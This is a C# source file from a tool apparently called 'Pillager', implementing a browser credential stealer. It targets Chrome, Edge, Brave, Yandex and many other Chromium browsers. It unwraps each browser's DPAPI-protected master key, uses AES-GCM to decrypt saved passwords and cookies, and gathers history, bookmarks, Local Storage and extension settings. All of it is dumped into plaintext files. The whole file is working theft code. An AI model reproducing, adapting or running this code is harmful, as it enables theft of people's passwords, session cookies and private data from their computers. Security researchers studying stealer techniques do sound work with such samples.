using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Pillager.Helper;

namespace Pillager.Browsers
{
    public class Chrome
    {
        public string BrowserPath { get; set; }

        public string BrowserName { get; set; }

        public byte[] MasterKey { get; set; }

        public static Dictionary<string, string> browserOnChromium = new Dictionary<string, string>
        {
            { "Chrome", "Google\\Chrome\\User Data" } ,
            { "Chrome Beta", "Google\\Chrome Beta\\User Data" } ,
            { "Chromium", "Chromium\\User Data" } ,
            { "Chrome SxS", "Google\\Chrome SxS\\User Data" },
            { "Edge", "Microsoft\\Edge\\User Data" } ,
            { "Brave-Browser", "BraveSoftware\\Brave-Browser\\User Data" } ,
            { "QQBrowser", "Tencent\\QQBrowser\\User Data" } ,
            { "SogouExplorer", "Sogou\\SogouExplorer\\User Data" } ,
            { "360ChromeX", "360ChromeX\\Chrome\\User Data" } ,
            { "Vivaldi", "Vivaldi\\User Data" } ,
            { "CocCoc", "CocCoc\\Browser\\User Data" },
            { "Torch", "Torch\\User Data" },
            { "Kometa", "Kometa\\User Data" },
            { "Orbitum", "Orbitum\\User Data" },
            { "CentBrowser", "CentBrowser\\User Data" },
            { "7Star", "7Star\\7Star\\User Data" },
            {"Sputnik", "Sputnik\\Sputnik\\User Data" },
            { "Epic Privacy Browser", "Epic Privacy Browser\\User Data" },
            { "Uran", "uCozMedia\\Uran\\User Data" },
            { "Yandex", "Yandex\\YandexBrowser\\User Data" },
            { "Iridium", "Iridium\\User Data" },
        };

        private string[] profiles = {
        "Default",
        "Profile 1",
        "Profile 2",
        "Profile 3",
        "Profile 4",
        "Profile 5"
        };

        public Chrome(string Name, string Path)
        {
            BrowserName = Name;
            BrowserPath = Path;
            MasterKey = GetMasterKey();
        }

        public byte[] GetMasterKey()
        {
            string filePath = Path.Combine(BrowserPath, "Local State");
            byte[] masterKey = new byte[] { };
            if (!File.Exists(filePath))
                return null;
            var pattern = new System.Text.RegularExpressions.Regex("\"encrypted_key\":\"(.*?)\"", System.Text.RegularExpressions.RegexOptions.Compiled).Matches(File.ReadAllText(filePath).Replace(" ",""));
            foreach (System.Text.RegularExpressions.Match prof in pattern)
            {
                if (prof.Success)
                    masterKey = Convert.FromBase64String((prof.Groups[1].Value));
            }
            byte[] temp = new byte[masterKey.Length - 5];
            Array.Copy(masterKey, 5, temp, 0, masterKey.Length - 5);
            try
            {
                return ProtectedData.Unprotect(temp, null, DataProtectionScope.CurrentUser);
            }
            catch
            {
                return null;
            }
        }

        private byte[] DecryptData(byte[] buffer)
        {
            byte[] decryptedData = null;
            if (MasterKey is null) return null;
            try
            {
                string bufferString = Encoding.Default.GetString(buffer);
                if (bufferString.StartsWith("v10") || bufferString.StartsWith("v11"))
                {
                    byte[] iv = new byte[12];
                    Array.Copy(buffer, 3, iv, 0, 12);
                    byte[] cipherText = new byte[buffer.Length - 15];
                    Array.Copy(buffer, 15, cipherText, 0, buffer.Length - 15);
                    byte[] tag = new byte[16];
                    Array.Copy(cipherText, cipherText.Length - 16, tag, 0, 16);
                    byte[] data = new byte[cipherText.Length - tag.Length];
                    Array.Copy(cipherText, 0, data, 0, cipherText.Length - tag.Length);
                    decryptedData = new AesGcm().Decrypt(MasterKey, iv, null, data, tag);
                }
                else
                {
                    decryptedData = ProtectedData.Unprotect(buffer, null, DataProtectionScope.CurrentUser);
                }
            }
            catch { }
            return decryptedData;
        }

        public string Chrome_passwords()
        {
            StringBuilder passwords = new StringBuilder();
            foreach (var profile in profiles)
            {
                string loginDataPath = Path.Combine(BrowserPath, profile + "\\Login Data");
                if (!File.Exists(loginDataPath))
                    continue;
                try
                {
                    string tempLoginDataPath = Path.GetTempFileName();
                    File.Copy(loginDataPath, tempLoginDataPath, true);
                    SQLiteHandler handler = new SQLiteHandler(tempLoginDataPath);
                    if (!handler.ReadTable("logins"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "origin_url");
                        string username = handler.GetValue(i, "username_value");
                        string crypt = handler.GetValue(i, "password_value");
                        string password = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                        if (url != null && url != "" && username != null && username != "" && !(password is null) && password.Length > 0)
                        {
                            passwords.Append("\t[URL] -> {" + url + "}\n\t[USERNAME] -> {" + username + "}\n\t[PASSWORD] -> {" + password + "}\n");
                            passwords.AppendLine();
                        }
                    }
                    File.Delete(tempLoginDataPath);
                }
                catch { }
            }
            return passwords.ToString();
        }

        public string Chrome_history()
        {
            StringBuilder history = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_History_path = BrowserName.Contains("360") ? Path.Combine(BrowserPath, profile + "\\360History") : Path.Combine(BrowserPath, profile + "\\History");
                if (!File.Exists(chrome_History_path))
                    continue;
                try
                {
                    string history_tempFile = Path.GetTempFileName();
                    File.Copy(chrome_History_path, history_tempFile, true);
                    SQLiteHandler handler = new SQLiteHandler(history_tempFile);
                    if (!handler.ReadTable("urls"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string url = handler.GetValue(i, "url");
                        history.AppendLine(url);
                    }
                    File.Delete(history_tempFile);
                }
                catch { }
            }
            return history.ToString(); ;
        }

        public string Chrome_cookies()
        {
            StringBuilder cookies = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_cookie_path = Path.Combine(BrowserPath, profile + "\\Cookies");
                string chrome_100plus_cookie_path = Path.Combine(BrowserPath, profile + "\\Network\\Cookies");
                if (!File.Exists(chrome_cookie_path) == true) 
                    chrome_cookie_path = chrome_100plus_cookie_path;
                if (!File.Exists(chrome_cookie_path))
                    continue;
                try
                {
                    string cookie_tempFile = Path.GetTempFileName();
                    try
                    {
                        File.Copy(chrome_cookie_path, cookie_tempFile, true);
                    }
                    catch
                    {
                        byte[] ckfile = LockedFile.ReadLockedFile(chrome_cookie_path);
                        if (ckfile != null)
                        {
                            File.WriteAllBytes(cookie_tempFile, ckfile);
                        }
                    }
                    SQLiteHandler handler = new SQLiteHandler(cookie_tempFile);
                    if (!handler.ReadTable("cookies"))
                        continue;
                    for (int i = 0; i < handler.GetRowCount(); i++)
                    {
                        string host_key = handler.GetValue(i, "host_key");
                        string name = handler.GetValue(i, "name");
                        string crypt = handler.GetValue(i, "encrypted_value");
                        string cookie = Encoding.UTF8.GetString(DecryptData(Convert.FromBase64String(crypt)));
                        cookies.AppendLine("[" + host_key + "] \t {" + name + "}={" + cookie + "}");
                    }
                    File.Delete(cookie_tempFile);
                }
                catch { }
            }
            return cookies.ToString();
        }

        public string Chrome_books()
        {
            StringBuilder stringBuilder = new StringBuilder();
            foreach (var profile in profiles)
            {
                string chrome_book_path = BrowserName.Contains("360")?Path.Combine(BrowserPath, profile + "\\360Bookmarks"): Path.Combine(BrowserPath, profile + "\\Bookmarks");
                if (File.Exists(chrome_book_path))
                {
                    stringBuilder.Append(File.ReadAllText(chrome_book_path));
                }
            }
            return stringBuilder.ToString();
        }

        public void Save(string path)
        {
            try
            {
                if (MasterKey == null) return;
                string savepath = Path.Combine(path, BrowserName);
                Directory.CreateDirectory(savepath);
                string cookies = Chrome_cookies();
                string passwords = Chrome_passwords();
                string books = Chrome_books();
                string history = Chrome_history();
                if (!String.IsNullOrEmpty(cookies)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_cookies.txt"), cookies);
                if (!String.IsNullOrEmpty(passwords)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_passwords.txt"), passwords);
                if (!String.IsNullOrEmpty(books)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_books.txt"), books);
                if (!String.IsNullOrEmpty(history)) File.WriteAllText(Path.Combine(savepath, BrowserName + "_history.txt"), history);
                if (Directory.Exists(Path.Combine(BrowserPath, "Local Storage"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Storage"), Path.Combine(savepath, "Local Storage"), true);
                if (Directory.Exists(Path.Combine(BrowserPath, "Local Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Local Extension Settings"), Path.Combine(savepath, "Local Extension Settings"), true);
                if (Directory.Exists(Path.Combine(BrowserPath, "Sync Extension Settings"))) Methods.CopyDirectory(Path.Combine(BrowserPath, "Sync Extension Settings"), Path.Combine(savepath, "Sync Extension Settings"), true);
            }
            catch { }
        }
    }
}
